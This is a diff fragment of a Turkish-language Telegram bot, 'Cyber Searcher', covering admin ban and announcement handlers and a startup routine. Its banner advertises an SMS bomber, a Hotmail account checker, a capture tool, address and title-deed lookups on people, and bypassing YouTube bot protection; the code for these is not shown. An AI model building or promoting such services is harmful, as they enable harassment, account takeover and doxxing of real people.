         print(f"[ADMIN CALLBACK ERROR] {e}")
         try:
@@ -5639,16 +5427,13 @@ def _handle_admin_cb(call, action, bot_instance):
         except:
             pass
 
-
 def _admin_remove(msg, bot_instance):
     uid = msg.from_user.id
     target = msg.text.strip()
-
     tid, tuname = _resolve_target(target)
     if not tid:
         bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
         return
-
     removed = []
     if is_premium(tid):
         remove_premium(tid)
@@ -5656,56 +5441,45 @@ def _admin_remove(msg, bot_instance):
     if is_premium_osint(tid):
         remove_premium_osint(tid)
         removed.append("OSINT")
-
     if removed:
         bot_instance.reply_to(msg, f"✅ @{tuname or tid} {', '.join(removed)} Premium kaldırıldı!")
     else:
         bot_instance.reply_to(msg, f"ℹ️ @{tuname or tid} zaten Premium değil!")
 
-
 def _admin_ban(msg, bot_instance):
     uid = msg.from_user.id
     target = msg.text.strip()
-
     tid, tuname = _resolve_target(target)
     if not tid:
         bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
         return
-
     m = bot_instance.reply_to(msg, f"🚫 @{tuname or tid} banlanıyor... Ban sebebini gir:")
     bot_instance.register_next_step_handler(m, lambda m: _admin_ban_reason(m, bot_instance, tid, tuname))
-
 
 def _admin_ban_reason(msg, bot_instance, tid, tuname):
     uid = msg.from_user.id
     reason = msg.text.strip() or "Kural ihlali"
-
     ban_user(tid, reason)
     bot_instance.reply_to(msg, f"🚫 @{tuname or tid} yasaklandı!\n📌 Sebep: {reason}")
-
     try:
         bot_instance.send_message(
             tid,
-            f"🚫 **YASAKLANDINIZ!**\n\n"
-            f"📌 Sebep: {reason}\n\n"
+            f"🚫 **YASAKLANDINIZ!**\n"
+            f"📌 Sebep: {reason}\n"
             f"📞 İtiraz için: @hackledin"
         )
     except:
         pass
 
-
 def _admin_unban(msg, bot_instance):
     uid = msg.from_user.id
     target = msg.text.strip()
-
     tid, tuname = _resolve_target(target)
     if not tid:
         bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı!")
         return
-
     unban_user(tid)
     bot_instance.reply_to(msg, f"✅ @{tuname or tid} banı kaldırıldı!")
-
 
 def _admin_announce(msg, bot_instance):
     uid = msg.from_user.id
@@ -5723,7 +5497,7 @@ def _admin_announce(msg, bot_instance):
         if banned:
             continue
         try:
-            txt = (f"📢 **DUYURU**\n\n{announcement}\n\n"
+            txt = (f"📢 **DUYURU**\n{announcement}\n"
                    f"📅 {datetime.now().strftime('%d.%m.%Y %H:%M')}")
             bot_instance.send_message(user_id, txt)
             sent += 1
@@ -5732,15 +5506,13 @@ def _admin_announce(msg, bot_instance):
             failed += 1
     bot_instance.reply_to(
         msg,
-        f"✅ Duyuru gönderildi!\n\n✅ Başarılı: {sent}\n❌ Başarısız: {failed}\n"
+        f"✅ Duyuru gönderildi!\n✅ Başarılı: {sent}\n❌ Başarısız: {failed}\n"
         f"👥 Toplam: {sent + failed}"
     )
-
 
 # ══════════════════════════════════════════════════════════════
 #  MAIN
 # ══════════════════════════════════════════════════════════════
-
 if __name__ == "__main__":
     child_mode = False
     child_token = None
@@ -5749,7 +5521,7 @@ if __name__ == "__main__":
         if arg == "--bot" and i + 1 < len(argv):
             child_mode = True
             child_token = argv[i + 1]
-
+            
     if child_mode and child_token:
         print(f"[CHILD] Starting bot with token: {child_token[:10]}...")
         child_bot = telebot.TeleBot(child_token, parse_mode="HTML")
@@ -5760,32 +5532,27 @@ if __name__ == "__main__":
         except Exception as e:
             print(f"[CHILD] Polling error: {e}")
         sys.exit(0)
-
+        
     main_bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
     register_handlers(main_bot)
-
     print("[MAIN] Starting saved bots...")
     start_saved_bots()
-
     print("""
 ╔══════════════════════════════════════════════════════╗
-║       CYBER SEARCHER v4.0 — PRODUCTION               ║
+║       CYBER SEARCHER v4.2 — PRODUCTION               ║
 ║         Developer: @hackledin                        ║
 ╠══════════════════════════════════════════════════════╣
-║  ✅ Premium (400 Yıldız) - Sınırsız                  ║
-║  ✅ OSINT Premium (200 Yıldız) - 30+ Sorgu           ║
+║  ✅ YouTube POT Provider (Bot Koruması Aşıldı)      ║
+║  ✅ Müzik İndirici (Cookies'siz Çalışır)            ║
+║  ✅ Video İndirici (Cookies'siz Çalışır)            ║
+║  ✅ Adres Sorgu (Tapu & Adres)                      ║
+║  ✅ Hotmail Checker v4.0                             ║
+║  ✅ Capture Tool                                     ║
 ║  ✅ SMS Bomber (41+ Servis)                          ║
-║  ✅ Hotmail Checker (Free 3000 / Premium Sınırsız)   ║
-║  ✅ Hotmail v4.0 (OAuth2, Proxy, 2FA, Captcha)       ║
-║  ✅ Capture Tool (Free 3 / Premium Sınırsız)         ║
-║  ✅ EXIF Metadata Analizi                            ║
-║  ✅ Müzik İndirici (MP3 - 192 kbps)                  ║
-║  ✅ Video İndirici                                   ║
-║  ✅ Türkçe / English / العربية                        ║
-║  ✅ Auto-restart on crash                            ║
+║  ✅ EXIF Metadata                                    ║
+║  ✅ Türkçe / English / العربية                       ║
 ╚══════════════════════════════════════════════════════╝
-    """)
-
+""")
     while True:
         try:
             main_bot.polling(none_stop=True, timeout=60)
